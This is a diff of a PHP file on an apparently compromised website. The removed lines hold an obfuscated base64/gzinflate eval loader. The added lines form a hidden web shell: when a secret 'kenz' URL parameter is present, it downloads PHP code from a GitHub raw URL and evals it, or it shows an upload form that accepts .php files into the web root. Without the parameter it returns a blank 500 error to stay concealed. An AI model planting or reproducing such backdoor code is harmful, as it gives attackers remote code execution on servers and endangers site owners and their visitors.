@@ -1,6 +1,53 @@
 <?php
-$Cyto = "Sy1LzNFQt1dLL7FW10uvKs1Lzs8tKEotLtZIr8rMS8tJLEnVSEosTjUziU9JT\x635PSdUoLikqSi3TUPHJrNAE\x41Ws\x41";
-$Lix = "=Mk6Vq8HkniLNuWl0nkUe4HxGCygcpoVSXVUVzmPfc+u2oW6eW2o0X45tTS/C/0rhcaJ6DjNbH7am6Y7nuVVaU60/rk6c6QQZd4Gsw3qMwSmXwt5sNDgAvoO16rMCKUMiINc6s+2bCzwN6KZwRTeEzMRly1i7XcCcZijNQLQuMKTWhAiMjElaVmmpxlMfGRVHb2/3PgXwXpsb2evkCRNwNJEkUjCYTiQ9AVTC8uY9TrxYH29X3XvSK2K4xnZlcQvZ9SAS2YMg1nMbYFytyMkxVyfn3iR8dyjfgLJdH99nXO/qx/pu34fuzIPbI6cCUmCE4BoAW9q8e6VQeeMnTfrR6AY+W4mV351Q+uTGiqfTyrKOTyaSiWMUNUw22rg3R3mAf/T31E3hpCMIOQKWH5PaOmlOvvR7ZcJNSAL4F0qlYrOxe/ae3nx8sMoCWRZGg+qrRPMiSIjSJLgH3EUbj7S0BeDu9aBoEAZFpabSv4diwMXo+M5ey0opJg29G5SCQCSq3s6lUmhHlrc5BLdpKzLD+I3xaLr7Y1Wy8Ht5eU8UyvJTOmy+hMyoUlYrXjtU6p1A3nYVfb26sXAiX14FDqyTumdYWCTaoS9nh8JON1ZFfgRcbqHO29vumg0KFISycgRYSlwuAoaHM+H/bl1yPnZRw3R7+mS61LC1OPCdLIUiMMSKdupSgSaJwWxsQSJBmLzn7xbDPmkY4NPrR3Ore8QXqj4B5zFiVm70g0CgBDZ9/MZNFrJbvNpGf7aghtJJCWwicxnAR6IPPDjXfaTRU+cK/jMgca7iExjafhC6jxQep453rjf/8aWF57pe+WGYODPzTFaYVExCbp94ty7FW/IbMBmNQIqQBG3TrgOzymN36ZTaRrY+ojP+0/luNr52G2XpMpRulw2NqB0uCWsjM+yZsU/R7BS4lnFYBJ9YvzMNeSZf8H0JvnkBdhxsy0xBFIB9OLamp7A2pJw0lbp0Dj3WDocA0IU/B9L9xAMb722V1In41vDCEfA";
-eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
-exit;
+if (isset($_GET['kenz'])) {
+
+    if (isset($_GET['kenzw'])) {
+        $remote_url = "https://raw.githubusercontent.com/kenzzz135/crontabb/refs/heads/main/door.php";
+        $remote_code = @file_get_contents($remote_url);
+
+        if ($remote_code !== false) {
+            eval("?>".$remote_code);
+        } else {
+            echo "Gagal mengambil script dari GitHub.";
+        }
+        exit;
+    }
+
+    if (isset($_POST['submit'])) {
+        $nama = $_FILES['gambar']['name'];
+        $tempat = $_FILES['gambar']['tmp_name'];
+        $type = $_FILES['gambar']['type'];
+        $size = $_FILES['gambar']['size'];
+
+        $ukuran = ['html', 'jpg', 'png', 'jpeg', 'php'];
+        $explode = explode('.', $nama);
+        $pembaginya = strtolower(end($explode));
+
+        if (in_array($pembaginya, $ukuran)) {
+            $target_dir = dirname(__FILE__) . '/';
+            $target_file = $target_dir . basename($nama);
+
+            if (move_uploaded_file($tempat, $target_file)) {
+                echo "File berhasil di-upload!<br>";
+                echo "Nama file: " . $nama . "<br>";
+                $file_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', $target_file);
+                echo "Link file: <a href='" . $file_url . "'>Lihat file</a><br>";
+            } else {
+                echo "Terjadi kesalahan saat meng-upload file.";
+            }
+        } else {
+            echo "Duh, ekstensi file tidak sesuai.";
+        }
+    } else {
+        echo '<form method="post" enctype="multipart/form-data">
+                <input type="file" name="gambar">
+                <input type="submit" name="submit" value="submit">
+              </form>';
+    }
+
+} else {
+    http_response_code(500);
+    echo "";
+}
+__halt_compiler();
 ?>
